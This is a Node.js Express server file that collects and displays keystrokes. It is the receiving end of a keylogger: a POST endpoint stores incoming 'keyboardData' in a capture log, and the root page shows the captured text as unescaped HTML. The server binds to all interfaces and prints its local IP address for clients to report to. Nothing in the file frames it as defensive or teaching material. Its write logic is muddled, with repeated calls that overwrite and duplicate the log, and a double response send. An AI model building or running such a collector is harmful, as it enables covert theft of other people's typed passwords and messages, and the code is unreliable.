import express from "express";
import bodyParser from "body-parser";
import fs from "fs";
import os from "os";
import { networkInterfaces } from "os";

const app = express();

// Create a logs directory if it doesn't exist
if (!fs.existsSync("./logs")) {
  fs.mkdirSync("./logs",{recursive:true});
}

const port = process.env.PORT || 8080;

// Helper function to get local IP dynamically
function getLocalIp() {
  const nets = networkInterfaces();
  for (const name of Object.keys(nets)) {
    for (const net of nets[name]) {
      if (net.family === "IPv4" && !net.internal) {
        return net.address;
      }
    }
  }
  return "127.0.0.1";
}

app.use(express.json());
app.use(bodyParser.json({ extended: true }));

// Root endpoint: display logged keyboard data
app.get("/", (req, res) => {
  try {
    const klFile = fs.readFileSync("./logs/keyboard_capture.txt", {
      encoding: "utf8",
      flag: "r",
    });
    res.send(`<h1>Logged data</h1><p>${klFile.replace(/\n/g, "<br>")}</p>`);
    res.send("✅ Server is alive! POST keyboard data here.");
  } catch {
    res.send("<h1>Nothing logged yet.</h1>");
  }
});

// POST endpoint: receive and store keyboard data
app.post("/", (req, res) => {
  const data = req.body.keyboardData;
  console.log(data);
  console.log("Received keyboard data:", data);
fs.appendFileSync("./logs/keyboard_capture.txt", data + "\n");
  fs.writeFileSync("./logs/keyboard_capture.txt", data || "");
  fs.appendFileSync("./logs/keyboard_capture.txt", data + "\n");
  fs.writeFileSync("./logs/keyboard_capture.txt", req.body.keyboardData);
  fs.appendFileSync("./logs/keyboard_capture.txt", data + "\n","utf8");
  res.send("✅ Successfully logged keyboard data");
});

// Start the server
const ip = getLocalIp();
app.listen(port, "0.0.0.0", () => {
  console.log(`✅ Server running at http://${ip}:${port}`);
});

